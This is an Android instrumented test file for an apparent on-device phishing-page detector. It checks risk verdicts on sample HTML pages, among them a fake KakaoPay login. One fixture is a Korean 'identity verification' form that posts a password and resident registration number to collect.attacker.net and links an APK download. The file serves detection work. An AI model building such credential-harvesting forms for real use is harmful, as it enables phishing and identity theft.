package com.guadian.ondevice.pagecontent

import androidx.test.platform.app.InstrumentationRegistry
import com.guadian.ondevice.judge.ReasonCode
import com.guadian.ondevice.judge.Risk
import com.guadian.ondevice.judge.RiskCategory
import com.guadian.ondevice.judge.Verdict
import com.guadian.ondevice.llm.PageObservation
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import java.net.URLEncoder

/**
 * PageContentJudge needs a real WebView (local `test` unit tests run against
 * a stub android.jar that no-ops WebView), so this runs only as an
 * instrumented test. Pages are loaded from data: URLs so the test needs no
 * network access and no fixture server.
 * Run with: ./gradlew connectedDebugAndroidTest
 */
class PageContentJudgeTest {
    private val context = InstrumentationRegistry.getInstrumentation().targetContext

    @Test
    fun flagsUnverifiedLoginFormAsMedium() {
        val verdict = judgeHtml("<html><body><form><input type=\"password\"></form></body></html>")

        assertEquals(Risk.MEDIUM, verdict.risk)
        assertEquals(RiskCategory.UNVERIFIED_LOGIN_FORM, verdict.category)
    }

    @Test
    fun flagsBrandLoginFormOnUnofficialHostAsHigh() {
        val verdict = judgeHtml(
            "<html><head><title>KakaoPay Login</title></head>" +
                "<body>Sign in to kakaopay to continue.<form><input type=\"password\"></form></body></html>"
        )

        assertEquals(Risk.HIGH, verdict.risk)
        assertEquals(RiskCategory.PAGE_BRAND_IMPERSONATION, verdict.category)
    }

    @Test
    fun brandMentionWithoutLoginFormIsNotHigh() {
        // Regression: a page that only names a brand ("Log in with Naver",
        // a news article) used to be HIGH by itself.
        val verdict = judgeHtml("<html><body>Log in with naver or read our kakao news.</body></html>")

        assertEquals(Risk.UNKNOWN, verdict.risk)
        assertEquals(ReasonCode.PAGE_BRAND_MENTION_ONLY, verdict.reason)
    }

    @Test
    fun returnsUncertainForPlainPageWithNoSignal() {
        val verdict = judgeHtml("<html><body>Just a plain article with nothing suspicious.</body></html>")

        assertEquals(Risk.UNKNOWN, verdict.risk)
    }

    @Test
    fun rejectsDataUrlsByDefault() {
        val verdict = runBlocking { PageContentJudge(context = context).judge("data:text/html,<p>x</p>") }

        assertEquals(ReasonCode.PAGE_UNSUPPORTED_SCHEME, verdict.reason)
    }

    @Test
    fun observesPageTheWayTheCollectorDid() {
        var observation: PageObservation? = null
        judgeHtml(
            "<html><head><title> Bank  Login </title><style>.x{}</style></head><body>" +
                "<p>본인 인증이</p><p>필요합니다</p><script>var hidden = 1;</script>" +
                "<form action=\"https://collect.attacker.net/p\"><input type=\"password\" name=\"pw\">" +
                "<input name=\"jumin\" placeholder=\"주민등록번호\"></form>" +
                "<a href=\"https://files.example.net/app.apk\">download</a></body></html>",
        ) { observation = it }

        val obs = checkNotNull(observation)
        assertTrue(obs.loaded)
        assertEquals("Bank  Login", obs.title)
        // Text nodes joined with spaces and collapsed; script and style text excluded.
        assertEquals("Bank Login 본인 인증이 필요합니다 download", obs.text)
        assertEquals(listOf("password", "rrn"), obs.forms.single().asks)
        assertEquals(listOf("https://files.example.net/app.apk"), obs.apkLinks)
    }

    private fun judgeHtml(html: String, onObservation: (PageObservation) -> Unit = {}): Verdict {
        // URLEncoder is form-encoding (space -> "+"), not URI percent-encoding;
        // a literal "+" between e.g. "input" and "type=..." would corrupt the
        // tag itself, so space must become "%20" instead.
        val encoded = URLEncoder.encode(html, "UTF-8").replace("+", "%20")
        val dataUrl = "data:text/html;charset=utf-8,$encoded"
        val judge = PageContentJudge(
            context = context,
            allowedSchemes = setOf("data"),
            onObservation = { _, obs -> onObservation(obs) },
        )
        return runBlocking { judge.judge(dataUrl) }
    }
}
